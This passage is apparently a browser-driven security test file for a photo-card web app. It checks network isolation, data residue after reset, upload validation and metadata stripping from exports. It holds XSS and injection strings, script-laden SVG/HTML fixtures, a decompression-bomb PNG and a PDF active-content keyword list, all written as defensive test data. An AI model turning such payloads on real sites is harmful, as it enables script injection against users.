// Security regression checks for the card constructor.
// No dependencies: uses Node (>=22) and an installed Chrome or Edge via the DevTools protocol.
// Run: node tests/security-audit.mjs   (optionally BROWSER_PATH=<path to chrome/msedge>)
// Only synthetic data is used. Nothing is sent outside this computer: a local HTTP server
// serves index.html, and "external" addresses use the reserved .invalid domain.
import { readFileSync, existsSync, mkdtempSync, rmSync, readdirSync, statSync } from 'node:fs';
import { createServer } from 'node:http';
import { spawn } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { deflateSync } from 'node:zlib';
import { strict as assert } from 'node:assert';

const html = readFileSync(new URL('../index.html', import.meta.url), 'utf8');
const script = html.split('<script>')[1].split('</script>')[0];

// ---------- find a browser ----------
function findBrowser() {
  const candidates = [process.env.BROWSER_PATH,
    'C:/Program Files/Google/Chrome/Application/chrome.exe',
    'C:/Program Files (x86)/Google/Chrome/Application/chrome.exe',
    'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe',
    'C:/Program Files/Microsoft/Edge/Application/msedge.exe',
    '/usr/bin/google-chrome', '/usr/bin/google-chrome-stable', '/usr/bin/chromium', '/usr/bin/chromium-browser',
    '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'];
  return candidates.find(p => p && existsSync(p));
}
const browserPath = findBrowser();
if (!browserPath) { console.error('No Chrome/Edge found. Set BROWSER_PATH.'); process.exit(2); }

// ---------- local server (records every request it receives) ----------
const served = [];
const server = createServer((req, res) => {
  served.push(req.method + ' ' + req.url);
  if (req.url === '/' || req.url.startsWith('/?')) {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(html);
  } else { res.writeHead(404); res.end(); }
});
await new Promise(r => server.listen(0, '127.0.0.1', r));
const origin = 'http://127.0.0.1:' + server.address().port;

// ---------- launch browser ----------
const profile = mkdtempSync(join(tmpdir(), 'adk-sec-'));
const downloads = join(profile, 'downloads');
const proc = spawn(browserPath, ['--headless=new', '--remote-debugging-port=0', '--user-data-dir=' + profile,
  '--no-first-run', '--no-default-browser-check', '--disable-extensions', '--disable-sync',
  '--disable-background-networking', '--disable-component-update',
  ...(process.env.CI ? ['--no-sandbox'] : []), 'about:blank'], { stdio: 'ignore' });
let portFile = join(profile, 'DevToolsActivePort');
for (let i = 0; i < 100 && !existsSync(portFile); i++) await new Promise(r => setTimeout(r, 100));
const [port, wsPath] = readFileSync(portFile, 'utf8').trim().split('\n');
const ws = new WebSocket('ws://127.0.0.1:' + port + wsPath);
await new Promise((resolve, reject) => { ws.onopen = resolve; ws.onerror = reject; });
let msgId = 0; const pending = new Map(); const handlers = [];
ws.onmessage = e => {
  const m = JSON.parse(e.data);
  if (m.id) { const p = pending.get(m.id); pending.delete(m.id); if (p) m.error ? p.reject(new Error(m.error.message)) : p.resolve(m.result); }
  else handlers.forEach(h => h(m));
};
function send(method, params = {}, sessionId) {
  const id = ++msgId;
  ws.send(JSON.stringify({ id, method, params, sessionId }));
  return new Promise((resolve, reject) => pending.set(id, { resolve, reject }));
}

// ---------- page helper ----------
async function newPage({ ua, init, touch, desktop } = {}) {
  const { targetId } = await send('Target.createTarget', { url: 'about:blank' });
  const { sessionId } = await send('Target.attachToTarget', { targetId, flatten: true });
  const page = { targetId, sessionId, requests: [], logs: [], violations: [], crashed: false, downloads: [] };
  handlers.push(m => {
    if (m.sessionId !== sessionId) return;
    if (m.method === 'Network.requestWillBeSent') page.requests.push(m.params.request.url);
    if (m.method === 'Network.webSocketCreated') page.requests.push(m.params.url);
    if (m.method === 'Log.entryAdded') page.logs.push(m.params.entry.source + ': ' + m.params.entry.text);
    if (m.method === 'Runtime.exceptionThrown') page.logs.push('exception: ' + (m.params.exceptionDetails.exception?.description || m.params.exceptionDetails.text));
    if (m.method === 'Inspector.targetCrashed') page.crashed = true;
  });
  handlers.push(m => {
    if (m.method === 'Browser.downloadWillBegin') page.downloads.push(m.params.suggestedFilename);
  });
  const s = (method, params) => send(method, params, sessionId);
  page.send = s;
  await s('Page.enable'); await s('Runtime.enable'); await s('Network.enable'); await s('Log.enable');
  if (ua) await s('Emulation.setUserAgentOverride', { userAgent: ua, platform: 'iPhone' });
  // Phone/tablet emulation (coarse pointer) or a fixed wide desktop window for real mouse clicks.
  if (touch) { await s('Emulation.setDeviceMetricsOverride', { width: 390, height: 844, deviceScaleFactor: 2, mobile: true }); await s('Emulation.setTouchEmulationEnabled', { enabled: true }); }
  if (desktop) await s('Emulation.setDeviceMetricsOverride', { width: 1280, height: 900, deviceScaleFactor: 1, mobile: false });
  // Record CSP violation events and stub window.print before the application starts.
  await s('Page.addScriptToEvaluateOnNewDocument', { source:
    `window.__violations=[];document.addEventListener('securitypolicyviolation',e=>window.__violations.push(e.violatedDirective+' '+e.blockedURI));
     window.__printCalls=0;window.print=()=>{window.__printCalls++;};
     window.confirm=()=>true;` + (init || '') });
  page.eval = async (expression, timeout = 60000) => {
    const r = await Promise.race([
      s('Runtime.evaluate', { expression, awaitPromise: true, returnByValue: true }),
      new Promise((_, rej) => setTimeout(() => rej(new Error('timeout ' + timeout + 'ms')), timeout))]);
    if (r.exceptionDetails) throw new Error(r.exceptionDetails.exception?.description || r.exceptionDetails.text);
    return r.result.value;
  };
  // Real mouse click at the centre of an element (not a script click).
  page.click = async selector => {
    const r = await page.eval(`(()=>{const e=document.querySelector(${JSON.stringify(selector)});if(!e)return null;e.scrollIntoView({block:'center'});const b=e.getBoundingClientRect();return {x:b.x+b.width/2,y:b.y+b.height/2,off:e.disabled===true,w:b.width};})()`);
    if (!r || r.off || !r.w) throw new Error('cannot click ' + selector + ' ' + JSON.stringify(r));
    for (const type of ['mouseMoved', 'mousePressed', 'mouseReleased']) await s('Input.dispatchMouseEvent', { type, x: r.x, y: r.y, button: 'left', clickCount: 1 });
  };
  page.waitFor = async (expression, ms = 15000) => { const end = Date.now() + ms; while (Date.now() < end) { if (await page.eval(expression, 5000)) return true; await new Promise(r => setTimeout(r, 100)); } throw new Error('condition not met: ' + expression.slice(0, 80)); };
  page.open = async () => {
    await s('Page.navigate', { url: origin + '/' });
    for (let i = 0; i < 100; i++) { try { if (await page.eval("document.readyState==='complete'&&typeof addFiles==='function'", 2000)) return; } catch {} await new Promise(r => setTimeout(r, 100)); }
    throw new Error('page did not load');
  };
  page.close = () => send('Target.closeTarget', { targetId });
  return page;
}

// ---------- synthetic fixtures (no real photos or personal data) ----------
function crc32(buf) { let c, crc = -1; for (let n = 0; n < buf.length; n++) { c = (crc ^ buf[n]) & 255; for (let k = 0; k < 8; k++) c = c & 1 ? 0xEDB88320 ^ (c >>> 1) : c >>> 1; crc = (crc >>> 8) ^ c; } return (crc ^ -1) >>> 0; }
function chunk(type, data) { const len = Buffer.alloc(4); len.writeUInt32BE(data.length); const t = Buffer.from(type, 'latin1'); const crc = Buffer.alloc(4); crc.writeUInt32BE(crc32(Buffer.concat([t, data]))); return Buffer.concat([len, t, data, crc]); }
function makePng(w, h, { gray1 = false, text = [] } = {}) {
  const ihdr = Buffer.alloc(13); ihdr.writeUInt32BE(w, 0); ihdr.writeUInt32BE(h, 4); ihdr[8] = gray1 ? 1 : 8; ihdr[9] = gray1 ? 0 : 2;
  const rowBytes = gray1 ? Math.ceil(w / 8) : w * 3;
  const raw = Buffer.alloc((rowBytes + 1) * h);
  if (!gray1) for (let y = 0; y < h; y++) for (let i = 1; i <= rowBytes; i++) raw[y * (rowBytes + 1) + i] = (i * 7 + y * 3) & 255;
  return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), chunk('IHDR', ihdr),
    ...text.map(t => chunk('tEXt', Buffer.from(t, 'latin1'))), chunk('IDAT', deflateSync(raw)), chunk('IEND', Buffer.alloc(0))]);
}
const b64 = buf => Buffer.from(buf).toString('base64');
// Helper source injected into the page: builds File objects from base64.
const pageHelpers = `
const mkFile=(b64,name,type)=>{const s=atob(b64);const a=new Uint8Array(s.length);for(let i=0;i<s.length;i++)a[i]=s.charCodeAt(i);return new File([a],name,{type});};
const canvasFile=async(w,h,color,name,type,marker)=>{const c=document.createElement('canvas');c.width=w;c.height=h;const x=c.getContext('2d');x.fillStyle=color;x.fillRect(0,0,w,h);x.fillStyle='#fff';x.fillRect(w/4,h/4,w/2,h/2);
 let blob=await new Promise(r=>c.toBlob(r,type,.9));
 if(marker&&type==='image/jpeg'){const b=new Uint8Array(await blob.arrayBuffer());const body=new TextEncoder().encode('Exif\\0\\0'+marker);const seg=new Uint8Array(4+body.length);seg[0]=255;seg[1]=225;seg[2]=((body.length+2)>>8);seg[3]=((body.length+2)&255);seg.set(body,4);const out=new Uint8Array(b.length+seg.length);out.set(b.subarray(0,2));out.set(seg,2);out.set(b.subarray(2),2+seg.length);blob=new Blob([out],{type});}
 return new File([blob],name,{type});};
const fileB64=f=>new Promise(r=>{const fr=new FileReader();fr.onload=()=>r(fr.result.split(',')[1]);fr.readAsDataURL(f);});
`;

// ---------- test runner ----------
const results = [];
async function test(name, fn) {
  try { await fn(); results.push([name, 'PASS']); console.log('PASS', name); }
  catch (e) { results.push([name, 'FAIL']); console.error('FAIL', name, '\n     ', String(e.message).split('\n')[0]); process.exitCode = 1; }
}
const MARKER = 'ZZ-TEST-CHILD-NAME-91ab';
let scenarioRequests = [];

try {
  await send('Browser.setDownloadBehavior', { behavior: 'allow', downloadPath: downloads, eventsEnabled: true });

  // =========================================================
  // A. Full realistic session on a fresh page
  // =========================================================
  const main = await newPage();
  await main.open();
  await main.eval(pageHelpers);

  await test('A1. Session: 3 images, captions, crop, matching, PDF, PNG, share, print, reset work without errors', async () => {
    const r = await main.eval(`(async()=>{
      await addFiles([await canvasFile(800,600,'#019bab','a.png','image/png'),await canvasFile(600,800,'#e5004f','b.jpg','image/jpeg'),await canvasFile(500,500,'#89bd1e','c.png','image/png')]);
      state.items[0].caption='${MARKER}-1';state.items[1].caption='${MARKER}-2';renderGallery();renderOutput();
      document.querySelector('.crop-btn').click();$('cropCaption').value='${MARKER}-crop';$('cropZoom').value='1.5';$('cropZoom').dispatchEvent(new Event('input'));$('cropApply').click();
      openBgHelp();closeBgHelp();
      const pdf=await buildPdfFile();const png=await buildPngFile();
      document.querySelector('[data-mode=matching]').click();
      const sides=document.querySelectorAll('.side-select');sides[0].value='left';sides[0].dispatchEvent(new Event('input',{bubbles:true}));sides[1].value='right';sides[1].dispatchEvent(new Event('input',{bubbles:true}));
      const pdf2=await buildPdfFile();
      await exportAction('pdf');await exportAction('png');
      runPrint();
      return {pdf:pdf.size,png:png.size,pdf2:pdf2.size,items:state.items.length,status:$('status').textContent};
    })()`);
    assert.ok(r.pdf > 1000 && r.png > 500 && r.pdf2 > 1000, JSON.stringify(r));
    await new Promise(r => setTimeout(r, 1500));
  });

  await test('A2. Downloads (PDF and PNG) are actually saved by the browser', async () => {
    for (let i = 0; i < 20 && main.downloads.length < 2; i++) await new Promise(r => setTimeout(r, 300));
    assert.ok(main.downloads.includes('ADK-kartochki.pdf') && main.downloads.some(n => n.endsWith('.png') || n.endsWith('.zip')), JSON.stringify(main.downloads));
  });

  await test('B1. No requests to external servers during the whole session (browser network log)', async () => {
    const external = main.requests.filter(u => !u.startsWith(origin) && !u.startsWith('blob:') && !u.startsWith('data:') && u !== 'about:blank');
    assert.deepEqual(external, [], 'external requests: ' + external.join(', '));
    assert.ok(main.requests.some(u => u.startsWith('blob:')) || true);
  });
  await test('B2. Local server saw only the page itself (no uploads, no beacons, no API calls)', async () => {
    const bad = served.filter(s => !/^GET \/(favicon\.ico)?$/.test(s));
    assert.deepEqual(bad, [], bad.join(', '));
  });
  await test('B3. Captions and file names never appear in any URL', async () => {
    const urls = main.requests.concat(await main.eval('location.href'));
    assert.ok(!urls.some(u => u.includes('ZZ-TEST') || u.includes('a.png')), urls.join(' '));
  });

  await test('C1. Nothing is written to localStorage, sessionStorage, cookies, IndexedDB, Cache API, Service Worker', async () => {
    const r = await main.eval(`(async()=>({ls:localStorage.length,ss:sessionStorage.length,cookie:document.cookie,
      idb:indexedDB.databases?(await indexedDB.databases()).length:0,caches:(await caches.keys()).length,
      sw:navigator.serviceWorker?(await navigator.serviceWorker.getRegistrations()).length:0}))()`);
    assert.deepEqual(r, { ls: 0, ss: 0, cookie: '', idb: 0, caches: 0, sw: 0 });
    try {
      const usage = await send('Storage.getUsageAndQuota', { origin });
      const used = (usage.usageBreakdown || []).filter(x => x.usage > 0);
      assert.deepEqual(used, [], JSON.stringify(used));
    } catch (e) { if (e instanceof assert.AssertionError) throw e; console.log('     (browser storage usage report unavailable in this mode: ' + e.message + ')'); }
  });
  await test('C2. Page URL and title never contain user data', async () => {
    const r = await main.eval('({u:location.href,t:document.title})');
    assert.equal(r.u, origin + '/'); assert.ok(!/ZZ-TEST/.test(r.t));
  });
  await test('C3. No console errors, exceptions or CSP violations during the session', async () => {
    const bad = main.logs.filter(l => !/favicon|Failed to load resource.*404/i.test(l));
    const v = await main.eval('window.__violations');
    assert.deepEqual(bad.concat(v), []);
  });

  // =========================================================
  // D. Reset / residue
  // =========================================================
  await test('D1. After "Начать заново" no photo, caption or crop data remains in application variables', async () => {
    const urlsBefore = await main.eval('state.items.map(i=>i.url)');
    await main.eval(`document.getElementById('reset').click()`);
    const r = await main.eval(`(async()=>({items:state.items.length,cache:exportBitmapCache.size,share:sharePdfCache===null,cropItem:cropItem===null,
      printRoot:$('printRoot').children.length,preview:$('preview').querySelectorAll('img').length,gallery:$('gallery').querySelectorAll('img').length,
      sel:selectedSheetItemId}))()`);
    assert.deepEqual(r, { items: 0, cache: 0, share: true, cropItem: true, printRoot: 0, preview: 0, gallery: 0, sel: null });
    // old blob: addresses must be revoked (not fetchable any more)
    const alive = await main.eval(`(async()=>{const out=[];for(const u of ${JSON.stringify(urlsBefore)}){try{await fetch(u);out.push(u);}catch(e){}}return out;})()`);
    assert.deepEqual(alive, [], 'blob URLs still alive: ' + alive.length);
  });
  await test('D2. After reset the crop dialog does not keep the last photo or the typed name', async () => {
    const r = await main.eval(`({src:$('cropImage').getAttribute('src'),cap:$('cropCaption').value})`);
    assert.ok(!r.src, 'cropImage still references a photo: ' + r.src);
    assert.equal(r.cap, '', 'cropCaption still contains: ' + r.cap);
  });
  await test('D3. After reset the caption text is absent from the whole DOM (text, attributes, field values)', async () => {
    const r = await main.eval(`(()=>{const all=[...document.querySelectorAll('*')];let hit=[];
      for(const el of all){if(el.value&&String(el.value).includes('ZZ-TEST'))hit.push(el.id||el.tagName);
        for(const a of el.attributes)if(a.value.includes('ZZ-TEST'))hit.push(el.tagName+'@'+a.name);}
      if(document.documentElement.textContent.includes('ZZ-TEST'))hit.push('textContent');return hit;})()`);
    assert.deepEqual(r, []);
  });
  await test('D4. JavaScript heap snapshot after reset and garbage collection does not contain the caption text', async () => {
    // The marker is rebuilt in the page, so the evaluated source text itself does not contain it.
    await main.eval(`(async()=>{await addFiles([await canvasFile(400,400,'#019bab','h.png','image/png')]);
      const name=['HEAP','MARK','ER','4f2c'].join('-');state.items[0].caption=name;renderGallery();renderOutput();await buildPdfFile();})()`);
    await main.eval(`document.getElementById('reset').click()`);
    await main.send('HeapProfiler.enable'); await main.send('HeapProfiler.collectGarbage'); await main.send('HeapProfiler.collectGarbage');
    let snap = ''; const h = m => { if (m.sessionId === main.sessionId && m.method === 'HeapProfiler.addHeapSnapshotChunk') snap += m.params.chunk; };
    handlers.push(h);
    await main.send('HeapProfiler.takeHeapSnapshot', { reportProgress: false });
    assert.ok(snap.length > 100000, 'snapshot too small');
    assert.ok(!snap.includes('HEAP-MARK-ER-4f2c'), 'caption string still present in JS heap');
  });

  // =========================================================
  // E. Upload safety
  // =========================================================
  const up = await newPage();
  await up.open(); await up.eval(pageHelpers);
  async function tryUpload(label, fileExpr, { expectAdded, timeout = 60000 }) {
    const before = await up.eval('state.items.length');
    const r = await up.eval(`(async()=>{const f=${fileExpr};await addFiles([f]);return {n:state.items.length,status:$('status').textContent,pwned:window.__pwned||0};})()`, timeout);
    assert.ok(!up.crashed, label + ': tab crashed');
    if (expectAdded !== undefined) assert.equal(r.n - before, expectAdded ? 1 : 0, label + ' -> ' + JSON.stringify(r));
    assert.equal(r.pwned, 0, label + ': code executed');
    return r;
  }
  const tiny = makePng(8, 8);
  await test('E1. Text file renamed to .png (type image/png) is rejected', async () => {
    await tryUpload('text', `mkFile('${b64('hello, not an image')}','fake.png','image/png')`, { expectAdded: false });
  });
  await test('E2. SVG with script, disguised as PNG, is rejected and does not run', async () => {
    const svg = '<svg xmlns="http://www.w3.org/2000/svg" onload="window.__pwned=1"><script>window.__pwned=1</script></svg>';
    await tryUpload('svg', `mkFile('${b64(svg)}','x.png','image/svg+xml')`, { expectAdded: false });
  });
  await test('E3. HTML page disguised as JPEG is rejected and does not run', async () => {
    await tryUpload('html', `mkFile('${b64('<html><script>window.__pwned=1</script></html>')}','x.jpg','image/jpeg')`, { expectAdded: false });
  });
  await test('E4. GIF and empty files are rejected', async () => {
    await tryUpload('gif', `mkFile('${b64('GIF89a' + 'x'.repeat(50))}','x.gif','image/gif')`, { expectAdded: false });
    await tryUpload('empty', `mkFile('','empty.png','image/png')`, { expectAdded: false });
  });
  await test('E5. Files with a valid signature but broken content (garbage, header only) are rejected without crashing', async () => {
    await tryUpload('garbage', `mkFile('${b64(Buffer.concat([tiny.subarray(0, 8), Buffer.from('garbage-garbage-garbage-garbage')]))}','g.png','image/png')`, { expectAdded: false });
    await tryUpload('jpeg3', `mkFile('${b64(Buffer.from([0xff, 0xd8, 0xff]))}','j.jpg','image/jpeg')`, { expectAdded: false });
    await tryUpload('webp', `mkFile('${b64(Buffer.concat([Buffer.from('RIFF'), Buffer.alloc(4), Buffer.from('WEBPVP8 '), Buffer.alloc(40, 7)]))}','w.webp','image/webp')`, { expectAdded: false });
  });
  await test('E5b. Truncated PNG (cut in half) does not crash or run anything (browser may show it partially)', async () => {
    const full = makePng(64, 64);
    const r = await tryUpload('truncated', `mkFile('${b64(full.subarray(0, Math.floor(full.length * .5)))}','t.png','image/png')`, { expectAdded: undefined });
    console.log('     truncated PNG result:', r.status);
  });
  await test('E10b. Declared size is read correctly from PNG / JPEG / WebP headers (and not fooled by large metadata)', async () => {
    const jpegSof = (w, h, padding) => Buffer.concat([Buffer.from([0xff, 0xd8]), Buffer.from([0xff, 0xe1, (padding + 2) >> 8, (padding + 2) & 255]), Buffer.alloc(padding, 1),
      Buffer.from([0xff, 0xc2, 0, 17, 8, h >> 8, h & 255, w >> 8, w & 255, 3, 1, 0x11, 0, 2, 0x11, 1, 3, 0x11, 1]), Buffer.from([0xff, 0xda, 0, 2])]);
    const webp = (kind, payload) => Buffer.concat([Buffer.from('RIFF'), Buffer.alloc(4), Buffer.from('WEBP' + kind), Buffer.alloc(4), payload, Buffer.alloc(8)]);
    const vp8x = (w, h) => { const p = Buffer.alloc(10); p.writeUIntLE(w - 1, 4, 3); p.writeUIntLE(h - 1, 7, 3); return webp('VP8X', p); };
    const vp8l = (w, h) => { const p = Buffer.alloc(5); p[0] = 0x2f; p.writeUInt32LE(((w - 1) | ((h - 1) << 14)) >>> 0, 1); return webp('VP8L', p); };
    const vp8 = (w, h) => { const p = Buffer.alloc(10); p[3] = 0x9d; p[4] = 1; p[5] = 0x2a; p.writeUInt16LE(w, 6); p.writeUInt16LE(h, 8); return webp('VP8 ', p); };
    const cases = [[makePng(12, 7), 'image/png', 84], [jpegSof(20000, 15000, 3000), 'image/jpeg', 3e8], [jpegSof(640, 480, 60000), 'image/jpeg', 307200],
      [vp8x(30000, 20000), 'image/webp', 6e8], [vp8l(8000, 6000), 'image/webp', 48e6], [vp8(4000, 3000), 'image/webp', 12e6]];
    const out = await up.eval(`(async()=>{const r=[];for(const [b,t] of ${JSON.stringify(cases.map(([b, t]) => [b64(b), t]))})r.push(await declaredPixels(mkFile(b,'x',t),t));return r;})()`);
    assert.deepEqual(out, cases.map(c => c[2]));
  });
  await test('E6. File with the wrong extension but a genuine PNG body is accepted by its real content', async () => {
    await tryUpload('mislabeled', `mkFile('${b64(tiny)}','photo.jpg','image/jpeg')`, { expectAdded: true });
  });
  await test('E7. Image with script text inside metadata (PNG tEXt) is shown as a picture only; nothing runs', async () => {
    const p = makePng(8, 8, { text: ['Comment\0<img src=x onerror=window.__pwned=1><script>window.__pwned=1</script>'] });
    await tryUpload('tEXt', `mkFile('${b64(p)}','m.png','image/png')`, { expectAdded: true });
  });
  await test('E8. File name with HTML/script is never inserted into the page', async () => {
    const name = '"><img src=x onerror=window.__pwned=1>NAME-LEAK-77.png';
    await tryUpload('filename', `mkFile('${b64(tiny)}',${JSON.stringify(name)},'image/png')`, { expectAdded: true });
    const leaked = await up.eval(`document.documentElement.outerHTML.includes('NAME-LEAK-77')||state.items.some(i=>JSON.stringify(i).includes('NAME-LEAK'))`);
    assert.equal(leaked, false, 'file name leaked into page/state (children names are often in photo file names)');
  });
  await test('E9. File larger than 25 MB is rejected with a clear message', async () => {
    const r = await tryUpload('big', `new File([new Uint8Array([137,80,78,71,13,10,26,10]),new Uint8Array(26*1024*1024)],'big.png',{type:'image/png'})`, { expectAdded: false });
    assert.ok(/25/.test(r.status), r.status);
  });
  await test('E10. Decompression bomb: tiny PNG file that declares 400 million pixels is refused safely (no hang, no crash)', async () => {
    const bomb = makePng(20000, 20000, { gray1: true });
    const started = Date.now();
    let r;
    try { r = await tryUpload('bomb', `mkFile('${b64(bomb)}','bomb.png','image/png')`, { expectAdded: false, timeout: 40000 }); }
    finally { console.log('     (bomb file', bomb.length, 'bytes, handled in', Date.now() - started, 'ms, crashed:', up.crashed + ')'); }
    assert.ok(/разрешен|слишком/i.test(r.status), 'no clear message: ' + r.status);
    assert.ok(Date.now() - started < 15000, 'took too long');
  });
  await test('E10c. Pixel limit: 120 Mpx on computers, 70 Mpx on touch devices (phones/tablets); both refuse oversized files instantly', async () => {
    const desk = await up.eval('MAX_IMAGE_PIXELS');
    assert.equal(desk, 120e6);
    const touch = await newPage({ touch: true });
    try {
      await touch.open(); await touch.eval(pageHelpers);
      assert.equal(await touch.eval('MAX_IMAGE_PIXELS'), 70e6);
      assert.equal(await touch.eval("matchMedia('(pointer: coarse)').matches"), true);
      const over = makePng(9400, 7500, { gray1: true }); // 70.5 Mpx: just over the phone limit, never decoded
      const t0 = Date.now();
      const r = await touch.eval(`(async()=>{await addFiles([mkFile('${b64(over)}','p.png','image/png')]);return {n:state.items.length,status:$('status').textContent};})()`, 20000);
      assert.equal(r.n, 0); assert.ok(/70 млн/.test(r.status), r.status); assert.ok(Date.now() - t0 < 5000);
      // phone-camera sized files stay accepted: 48 Mpx JPEG/PNG headers are under the limit
      const under = await touch.eval(`(async()=>{const b=new Uint8Array(30);const f=[[8064,6048],[8192,6144],[9280,6944]].map(([w,h])=>w*h<MAX_IMAGE_PIXELS);return f;})()`);
      assert.deepEqual(under, [true, true, true]);
    } finally { await touch.close(); }
  });
  await test('E11. Large but reasonable photo (4000x3000) is still accepted and downscaled to 3000 px', async () => {
    const r = await up.eval(`(async()=>{await addFiles([await canvasFile(4000,3000,'#019bab','big.jpg','image/jpeg')]);const it=state.items.at(-1);return {w:it.w,h:it.h};})()`);
    assert.deepEqual(r, { w: 3000, h: 2250 });
  });

  // =========================================================
  // F. Captions: XSS / injection / odd text
  // =========================================================
  const cap = await newPage();
  await cap.open(); await cap.eval(pageHelpers);
  const evil = ['<img src=x onerror=window.__pwned=1>', '</option></select><script>window.__pwned=1</script>', '"><svg onload=window.__pwned=1>',
    'javascript:window.__pwned=1', "';window.__pwned=1;//", '${window.__pwned=1}', '{{constructor.constructor("window.__pwned=1")()}}',
    '\u202Eevil\u202C RTL', 'A'.repeat(80), 'Ё'.repeat(80), '😀👨‍👩‍👧 emoji', '\u0000nul\u0001ctl', '<style>*{display:none}</style>'];
  await test('F1. Hostile captions are shown only as text: no code runs, no tags are created, in gallery / sheet / selector / print / crop', async () => {
    const r = await cap.eval(`(async()=>{
      await addFiles([await canvasFile(300,300,'#019bab','a.png','image/png')]);
      const evil=${JSON.stringify(evil)};const out=[];
      for(const text of evil){
        const input=document.querySelector('.cap-input');input.value=text;input.dispatchEvent(new Event('input',{bubbles:true}));
        document.querySelector('.crop-btn').click();$('cropCaption').value=text;$('cropCaption').dispatchEvent(new Event('input'));$('cropCancel').click();
        const injected=document.querySelectorAll('#preview script,#printRoot script,#gallery script,#preview img[onerror],#printRoot img[onerror],#gallery img[onerror],#sheetImageSelect script,#preview svg[onload],#gallery svg[onload],#preview style,#printRoot style,#gallery style').length;
        const pdf=await buildPdfFile();
        out.push({injected,pwned:window.__pwned||0,pdfOk:pdf.size>1000});
      }
      const capText=document.querySelector('#printRoot .cap')?.textContent;
      return {out,capText};})()`);
    assert.ok(r.out.every(x => x.injected === 0 && x.pwned === 0 && x.pdfOk), JSON.stringify(r.out.filter(x => x.injected || x.pwned || !x.pdfOk)));
    assert.equal(r.capText, '<style>*{display:none}</style>');
  });
  await test('F2. Caption text length is limited to 80 characters in both input fields', async () => {
    const r = await cap.eval(`({a:document.querySelector('.cap-input').maxLength,b:$('cropCaption').maxLength})`);
    assert.deepEqual(r, { a: 80, b: 80 });
  });
  await test('F3. Caption fields do not offer to remember typed names (autocomplete off)', async () => {
    const r = await cap.eval(`({a:document.querySelector('.cap-input').autocomplete,b:$('cropCaption').autocomplete})`);
    assert.deepEqual(r, { a: 'off', b: 'off' });
  });

  // =========================================================
  // G. Exported files: structure and hidden data
  // =========================================================
  const ex = await newPage();
  await ex.open(); await ex.eval(pageHelpers);
  const EXIF = 'EXIF-SECRET-GPS-55.7558N-37.6173E-OWNER-IVANOVA';
  const pngText = makePng(40, 40, { text: ['Author\0EXIF-SECRET-PNG-AUTHOR', 'Comment\0EXIF-SECRET-PNG-COMMENT'] });
  const exported = await ex.eval(`(async()=>{
    const jpg=await canvasFile(640,480,'#019bab','p.jpg','image/jpeg','${EXIF}');
    const jpgHasMarker=new TextDecoder('latin1').decode(new Uint8Array(await jpg.arrayBuffer())).includes('${EXIF}');
    await addFiles([jpg,mkFile('${b64(pngText)}','q.png','image/png')]);
    state.items[0].caption='${MARKER}-A';state.items[1].caption='Маша';renderGallery();renderOutput();
    const storedHasMarker=new TextDecoder('latin1').decode(new Uint8Array(await (await fetch(state.items[0].url)).arrayBuffer())).includes('${EXIF}');
    const pdf=await buildPdfFile();
    const png=await buildPngFile();
    document.querySelector('[data-mode=matching]').click();
    const s=document.querySelectorAll('.side-select');s[0].value='left';s[0].dispatchEvent(new Event('input',{bubbles:true}));s[1].value='right';s[1].dispatchEvent(new Event('input',{bubbles:true}));
    const pdfM=await buildPdfFile();
    return {jpgHasMarker,storedHasMarker,pdf:await fileB64(pdf),png:await fileB64(png),pdfM:await fileB64(pdfM),pdfName:pdf.name,pngName:png.name,pdfType:pdf.type};
  })()`);
  const pdfBytes = Buffer.from(exported.pdf, 'base64'), pngBytes = Buffer.from(exported.png, 'base64'), pdfMBytes = Buffer.from(exported.pdfM, 'base64');
  await test('G0. Test input JPEG really contains the secret EXIF marker (so the checks below are meaningful)', () => assert.ok(exported.jpgHasMarker));
  await test('G1. PDF is well formed: header, trailer, every xref offset points to its object', () => {
    for (const buf of [pdfBytes, pdfMBytes]) {
      const t = buf.toString('latin1');
      assert.ok(t.startsWith('%PDF-1.4') && t.trimEnd().endsWith('%%EOF'));
      const xrefAt = Number(/startxref\n(\d+)/.exec(t)[1]);
      assert.ok(t.slice(xrefAt).startsWith('xref'));
      const lines = t.slice(xrefAt).split('\n'); const count = Number(lines[1].split(' ')[1]);
      for (let i = 1; i < count; i++) { const off = Number(lines[2 + i].slice(0, 10)); assert.ok(t.slice(off).startsWith(i + ' 0 obj'), 'bad offset for object ' + i); }
    }
  });
  await test('G2. PDF contains no active content (JavaScript, auto-open actions, launch, embedded files, links, forms)', () => {
    const t = pdfBytes.toString('latin1');
    const objectsOnly = t.replace(/stream\n[\s\S]*?\nendstream/g, '');
    for (const word of ['/JavaScript', '/JS', '/OpenAction', '/AA', '/Launch', '/EmbeddedFile', '/URI', '/AcroForm', '/SubmitForm', '/GoToR', '/RichMedia'])
      assert.ok(!objectsOnly.includes(word), 'PDF contains ' + word);
  });
  await test('G3. PDF has no author/creator/producer/date/title metadata and no document info', () => {
    const t = pdfBytes.toString('latin1');
    for (const word of ['/Info', '/Author', '/Creator', '/Producer', '/CreationDate', '/Title', '/Metadata', '/XMP'])
      assert.ok(!t.replace(/stream\n[\s\S]*?\nendstream/g, '').includes(word), 'PDF contains ' + word);
  });
  await test('G4. EXIF/GPS/owner data from the source JPEG and PNG text chunks does not reach the PDF or PNG files', () => {
    for (const buf of [pdfBytes, pngBytes, pdfMBytes]) {
      const t = buf.toString('latin1');
      assert.ok(!t.includes('EXIF-SECRET') && !t.includes('GPS') && !t.includes('IVANOVA'), 'metadata leaked');
    }
  });
  await test('G5. PNG export contains only image chunks (no text/EXIF chunks); ZIP/file names are fixed and contain no captions', () => {
    const types = []; let p = 8;
    const png = exported.pngName.endsWith('.png') ? pngBytes : null;
    if (png) { while (p < png.length) { const len = png.readUInt32BE(p); types.push(png.toString('latin1', p + 4, p + 8)); p += 12 + len; } }
    for (const t of types) assert.ok(['IHDR', 'pHYs', 'IDAT', 'IEND', 'sRGB', 'gAMA', 'cHRM', 'iCCP'].includes(t), 'unexpected chunk ' + t);
    assert.ok(/^ADK-[A-Za-z0-9_.-]+\.(png|zip)$/.test(exported.pngName) && exported.pdfName === 'ADK-kartochki.pdf' && exported.pdfType === 'application/pdf');
  });
  await test('G6. For information: original photo kept in browser memory still carries its EXIF (only in memory; never exported)', () => {
    console.log('     stored copy contains EXIF:', exported.storedHasMarker);
  });

  // =========================================================
  // H. Print
  // =========================================================
  const pr = await newPage();
